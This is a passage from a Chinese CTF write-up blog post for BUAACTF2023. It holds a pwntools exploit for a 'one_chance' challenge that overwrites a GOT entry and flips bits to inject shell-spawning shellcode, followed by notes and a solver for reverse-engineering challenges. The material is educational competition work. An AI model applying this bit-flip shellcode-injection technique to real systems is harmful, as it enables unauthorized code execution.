+所以第一步是想办法跳到后门上。注意到在写完bit后用了一个exit。第一次修改就改exit的got。作者精心准备了一连串的空函数作为跳板，跟着走到最后能把exit的got改成后门地址。</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> binascii
+<span style="color:#f92672">from</span> Crypto.Util.strxor <span style="color:#f92672">import</span> strxor
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-h&#39;</span>]
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;one_chance&#34;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;10.212.27.23&#34;</span>, <span style="color:#e6db74">&#34;12138&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flip_bit</span>(addr, bitnum):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;?&#34;</span>)
+    p<span style="color:#f92672">.</span>sendline(addr)
+    p<span style="color:#f92672">.</span>sendline(bitnum)
+
+<span style="color:#75715e"># call mprotect</span>
+flip_bit(<span style="color:#e6db74">&#34;404039&#34;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
+flip_bit(<span style="color:#e6db74">&#34;404038&#34;</span>, <span style="color:#e6db74">&#34;6&#34;</span>)
+flip_bit(<span style="color:#e6db74">&#34;404038&#34;</span>, <span style="color:#e6db74">&#34;7&#34;</span>)
+flip_bit(<span style="color:#e6db74">&#34;404038&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>)
+flip_bit(<span style="color:#e6db74">&#34;404038&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)</code></pre></div>
+</div>
+<p>然后往0x10e1写入shellcode，这样就能通过改最后jmp地址的一位跳过去。</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># write shellcode</span>
+dump_10e1 <span style="color:#f92672">=</span> binascii<span style="color:#f92672">.</span>unhexlify(<span style="color:#e6db74">&#34;50 54 49 C7 C0 10 13 40 00 48 C7 C1 A0 12 40 00 48 C7 C7 D5 11 40 00 FF 15 F2 2E 00 00 F4 90 F3 0F 1E FA C3 66 2E 0F 1F 84 00 00 00 00 00 90 B8&#34;</span><span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>))
+shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>sh())
+modi_bytes <span style="color:#f92672">=</span> strxor(dump_10e1, shellcode)
+<span style="color:#66d9ef">for</span> idx, i <span style="color:#f92672">in</span> enumerate(modi_bytes):
+    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>:
+        log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;flipping &#34;</span><span style="color:#f92672">+</span>hex(int(<span style="color:#e6db74">&#34;0x4010e1&#34;</span>, <span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span>idx))
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>j <span style="color:#f92672">&amp;</span> ord(i) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+                p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;?&#34;</span>)
+                p<span style="color:#f92672">.</span>sendline(hex(int(<span style="color:#e6db74">&#34;0x4010e1&#34;</span>, <span style="color:#ae81ff">16</span>)<span style="color:#f92672">+</span>idx))
+                p<span style="color:#f92672">.</span>sendline(str(j))
+
+<span style="color:#75715e"># modify jmp</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;?&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;401299&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;0&#34;</span>)
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-8" class="outline-2">
+<h2 id="headline-8">
+re
+</h2>
+<div id="outline-text-headline-8" class="outline-text-2">
+<div id="outline-container-headline-9" class="outline-3">
+<h3 id="headline-9">
+snake
+</h3>
+<div id="outline-text-headline-9" class="outline-text-3">
+<p>其实直接动态调试就能出来。但我开始没想到，用python des解密出来的。
+<img src="/img/2023-04-26_snake.png" alt="/img/2023-04-26_snake.png" title="/img/2023-04-26_snake.png" />
+flag 用des加密后存在数据段。密钥直接写在代码里
+<img src="/img/2023-04-26_desdecrypt.png" alt="/img/2023-04-26_desdecrypt.png" title="/img/2023-04-26_desdecrypt.png" /></p>
+</div>
+</div>
+<div id="outline-container-headline-10" class="outline-3">
+<h3 id="headline-10">
+minesweep
+</h3>
+<div id="outline-text-headline-10" class="outline-text-3">
+<p><img src="/img/2023-04-26_minesweepenc.png" alt="/img/2023-04-26_minesweepenc.png" title="/img/2023-04-26_minesweepenc.png" />
+加密过程用到了mine数组，一个7*7，用字符‘a&#39;和&#39;b&#39;表示。然后对flag前7个字符中的小写字母加密。第i个字符用mine中的第i行以及该字符后面的6个字符一起加密。这样只要从后往前恢复每个字符就行。但是mine在程序运行后会先计算周围的地雷数量。
+<img src="/img/2023-04-26_minecal.png" alt="/img/2023-04-26_minecal.png" title="/img/2023-04-26_minecal.png" />
+可以直接动调后再把mine倒出来解密。</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">mine2 <span style="color:#f92672">=</span> [
+    [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>],
+    [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>],
+    [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>],
+    [<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>],
+    [<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>],
+    [<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>],
+    [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>]
+]
+c <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;vahii&#34;</span>
+<span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+    temp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+            temp <span style="color:#f92672">+=</span> (ord(flag[i])<span style="color:#f92672">-</span><span style="color:#ae81ff">97</span>)<span style="color:#f92672">^</span>mine2[i][j]
+    poschr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">26</span>):
+        <span style="color:#66d9ef">if</span> chr((temp<span style="color:#f92672">^</span>l)<span style="color:#f92672">%</span><span style="color:#ae81ff">26</span><span style="color:#f92672">+</span><span style="color:#ae81ff">97</span>) <span style="color:#f92672">==</span> c[k]:
+            tmpchr <span style="color:#f92672">=</span> chr(l<span style="color:#f92672">+</span><span style="color:#ae81ff">97</span>)
+            poschr <span style="color:#f92672">+=</span> tmpchr
+            <span style="color:#66d9ef">break</span>
+
+    print(temp, c[k])
+    print(poschr)
+    flag <span style="color:#f92672">=</span> tmpchr<span style="color:#f92672">+</span>flag
+
+print(flag)</code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-11" class="outline-3">
+<h3 id="headline-11">
+ezvm
+</h3>
+<div id="outline-text-headline-11" class="outline-text-3">
+<p>初始化的地址做了1字节的偏移，ida上稍微调整一下。大致是malloc了两个结构体，第一个便宜0x40的地方用来存指令地址和ip，ZF，还有第二个结构的地址。第二个用来存输入字符串和加密后的flag。
+<img src="/img/2023-04-26_11e9.png" alt="/img/2023-04-26_11e9.png" title="/img/2023-04-26_11e9.png" />
+然后是痛苦的瞪。瞪了一下午硬逆了8条指令。
+<img src="/img/2023-04-26_ezvm.jpeg" alt="/img/2023-04-26_ezvm.jpeg" title="/img/2023-04-26_ezvm.jpeg" />
+最后解析指令集，发现只是简单的xor。
+以前没有怎么做过re，这次做这题本来是为了做pwn的ezvm。后面感觉快出了但时间不太够了。。</p>
+</div>
+</div>
+</div>
+</div>
+</article>
+    </section>
+
+    <footer class="ui attached segment dream-tags" data-html2canvas-ignore>
+      
+        
+          <a class="ui label" href="/tags/ctf" title="ctf">ctf</a>
+        
+          <a class="ui label" href="/tags/pwn" title="pwn">pwn</a>
+        
+      
+      <div
+        class="ui label"
+        style="float: right; cursor: pointer;"
+        onclick="savePostAsImg()">
+        <i class="save icon"></i>Save as image
+      </div>
+    </footer>
+
+    
+
+    
+    
+    
+
+    
+
+  </div>
+  <aside class="sixteen wide mobile sixteen wide tablet four wide computer column dream-single-aside">
+    
+    
+      <div class="ui segment toc">
+        <nav id="TableOfContents">
+<ul>
+<li><a href="#headline-1">crypto</a>
+<ul>
+<li><a href="#headline-2">Block Cipher</a>
+</li>
+</ul>
+</li>
+<li><a href="#headline-3">pwn</a>
+<ul>
+<li><a href="#headline-4">NLP</a>
+</li>
+<li><a href="#headline-5">pirate</a>
+</li>
+<li><a href="#headline-6">noshell</a>
+</li>
+<li><a href="#headline-7">lose yourself</a>
+</li>
+</ul>
+</li>
+<li><a href="#headline-8">re</a>
+<ul>
+<li><a href="#headline-9">snake</a>
+</li>
+<li><a href="#headline-10">minesweep</a>
+</li>
+<li><a href="#headline-11">ezvm</a>
+</li>
+</ul>
+</li>
+</ul>
+</nav>
+      </div>
+    
+
+    <article class="dream-header">
+  <section class="ui top attached center aligned segment">
+    <div class="ui small circular image">
+      
+        <img src="/img/avatar.png">
+      
+    </div>
+
+    
+    <h1 class="ui medium header">
+    
+      Iluvata&#39;s blog
+      <div class="sub header" style="margin-top: 0.5rem;">shine on you crazy diamond</div>
+    
+    </h1>
+    
+
+    <div class="ui horizontal list">
+      
+      <a class="item" href="/tags">
+        <i class="tags icon" title="All Tags"></i>
+      </a>
+      <a class="item" href="/categories">
+        <i class="th list icon" title="All Categories"></i>
+      </a>
+    </div>
+  </section>
+
+  
+  <section class="ui attached center aligned segment dream-tags">
+    
+      
+      
+      <a class="ui label" href="/tags/algorithm/" title="Algorithm">
+        Algorithm
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/ctf/" title="Ctf">
+        Ctf
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/emacs/" title="Emacs">
+        Emacs
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/hugo/" title="Hugo">
+        Hugo
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/information/" title="Information">
+        Information
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/math/" title="Math">
+        Math
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/operating-system/" title="Operating System">
+        Operating System
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/pwn/" title="Pwn">
+        Pwn
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/sicp/" title="Sicp">
+        Sicp
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/web/" title="Web">
+        Web
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/work/" title="Work">
+        Work
+      </a>
+    
+      
+      
+      <a class="ui label" href="/tags/%E8%80%83%E7%A0%94/" title="考研">
+        考研
+      </a>
+    
+  </section>
+  
+
+  
+  <section class="ui attached segment dream-categories">
+    <div class="ui accordion">
+      
+      
+      
+      
+      
+
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            
+            
+            <a class="item" href="/categories/learning/" title="Learning">
+              Learning
+            </a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2022-03-28_buaactf2022/">BUAACTF2022 WP</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2023-04-26_buaactf2023/">BUAACTF2023 WP</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-12-28_hugo-with-latex/">在hugo中使用latex</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-12-28_structural-information/">结构信息论</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-12-28_n1book-web/">N1Book Web 学习</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-12-23_heap/">pwn堆题整理</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-11-13_rop/">ROP</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-11-10_ctf-libc-leak/">libc泄漏</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-09-24_ctf-tools/">CTF基本工具使用指北</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-04-07_iteration-and-recurtion/">迭代与递归</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-19_distributions/">概率统计中的分布</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-15_computer-structure/">计算机体系结构与组成原理</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-14_basic-elements-for-programming-language/">编程语言的基本组成</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-09_file-and-database/">文件系统与数据库系统</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-04_euler-circuit-and-hamiltonian-circuit/">欧拉环路和汉密尔顿环路</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-03-01_how-computer-startup/">电脑是怎么启动的</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-24_greedy-and-dijkstra/">理解贪心算法与Dijkstra算法</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-19_dp-and-warshall/">理解动态规划与warshall算法</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+        
+
+        
+          <div class="title">
+            <i class="dropdown icon"></i>
+            
+            
+            <a class="item" href="/categories/life/" title="Life">
+              Life
+            </a>
+          </div>
+          <div class="content">
+            <div class="ui list">
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2022-03-28_buaactf2022/">BUAACTF2022 WP</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2023-04-26_buaactf2023/">BUAACTF2023 WP</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-04-19_likehood-reasoning/">最大似然估计与基本演绎法</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-22_latex-with-emacs/">在org mode中嵌入latex</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-16_yearly-review/">2020年度回顾以及新年目标</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-02_scheme-in-emacs/">在spacemacs中写scheme</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-02-02_hugo-with-emacs/">用easy-hugo在spacemacs中写hugo博客</a>
+                </div>
+              </div>
+            
+              <div class="item">
+                <div class="content">
+                  <a class="item" href="/post/2021-01-27_hugo-config/">hugo 博客配置</a>
+                </div>
+              </div>
+            
+            </div>
+          </div>
+        
+      
+
+      
+    </div>
+  </section>
+  
+
+  <section class="ui attached segment header-socials">
+    <nav class="ui secondary menu dream-menu dream-socials">
+  
+  
+    <div class="item">
+      <a href="mailto:dyhdjyc@gmail.com">
+        <i class=" mail icon" title="Email"></i>
+      </a>
+    </div>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</nav>
+
+  </section>
+
+  <section class="ui bottom attached center aligned segment">
+    
+      <p>© 2021 - 2023 Iluvata&#39;s Blog</p>
+    
+
+    <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
+
+    
+  </section>
+</article>
+
+  </aside>
+</div>
+
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <div class="ui centered relaxed grid dream-grid dream-back">
+  
+  
+  
+
+  <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article>
+      <div class="ui top attached segment">
+        <h3 class="ui header">Social Links</h3>
+      </div>
+      <div class="ui bottom attached segment">
+        <nav class="ui secondary menu dream-menu dream-socials">
+  
+  
+    <div class="item">
+      <a href="mailto:dyhdjyc@gmail.com">
+        <i class="large mail icon" title="Email"></i>
+      </a>
+    </div>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</nav>
+
+      </div>
+    </article>
+  </section>
+
+  <section class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+  </section>
+
+  
+    
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script>
+  window.defaultDark =  null 
+  window.backgroundDark =  null 
+  window.backgroundImageDark =  null 
+  window.darkNav =  true 
+  window.hasTwitterEmbed =  null 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="/js/jquery.min.js"></script>
+<script src="/js/semantic.min.js"></script>
+<script src="/js/jquery.overlayScrollbars.min.js"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+<script src="/js/html2canvas.min.js"></script>
+<script src="/js/post.js"></script>
+
+
+
+
+
+    
+
+    
+  </body>
+</html>
